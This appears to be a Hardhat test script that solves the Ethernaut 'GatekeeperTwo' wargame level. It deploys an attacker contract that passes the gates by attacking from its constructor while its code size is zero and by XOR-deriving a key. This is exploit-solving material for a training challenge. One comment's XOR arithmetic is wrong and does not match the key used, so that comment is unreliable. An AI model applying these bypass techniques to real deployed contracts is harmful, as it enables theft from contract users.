import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`GatekeeperTwo`);
  // The below address comes from Ethernaut deployed on Rinkeby
  // Go to https://ethernaut.openzeppelin.com/, select a Level, grab address
  // from the URL
  const challengeAddress = await createChallenge(
    `0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  // Gate 3 processes our key and compares it to uint(0) - 1 which overflows to 0xff.fff
  // It when does XOR (via the ^ operator). XOR "cancels out" when you apply it twice with the
  // same value.
  // To solve gate 3, deploy the contract and calculate the LHS of the equation. Then 
  // XOR this value with 0xff.fff to obtain the correct gate key.
  // In my case the LHS computed to `0xac9df252c237bbef`.
  // `0xac9df252c237bbef` XOR `0xffffffffffffffff` == `0xac9df252c237bbef`. This is our key.
  const key = `0x53620dad3dc84410`;

  // During construction a contract will have a code size of 0.
  // Therefore, all the attacking will happen in the constructor in order to bypass Gate 2.
  const attackerFactory = await ethers.getContractFactory(`GatekeeperTwoAttacker`);
  attacker = await attackerFactory.deploy(challenge.address, key);
});

it("solves the challenge", async function () {
    const codesize = await ethers.utils.hexlify(await attacker.codesize());
    // Set up tests
    //await attacker.setKey(key);

    const gateThreeLHSa = await ethers.utils.hexlify(await attacker.g3LHSa());
    const gateThreeLHSb = await ethers.utils.hexlify(await attacker.g3LHSb());
    const gateThreeLHS = await ethers.utils.hexlify(await attacker.g3LHS());
    const gateThreeRHS = await ethers.utils.hexlify(await attacker.g3RHS());
    const caller = await ethers.utils.hexlify(await attacker.caller());

    console.log(`Code size:\t\t\t${codesize}`);
    console.log(`EOA:\t\t\t${await eoa.getAddress()}`);
    console.log(`Caller:\t\t\t${caller}`);
    console.log(`Gate 3 LHSa:\t\t${gateThreeLHSa}`);
    console.log(`Gate 3 LHSb:\t\t${gateThreeLHSb}`);
    console.log(`Gate 3 LHS:\t\t${gateThreeLHS}`);
    console.log(`Gate 3 RHS:\t\t${gateThreeRHS}`);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
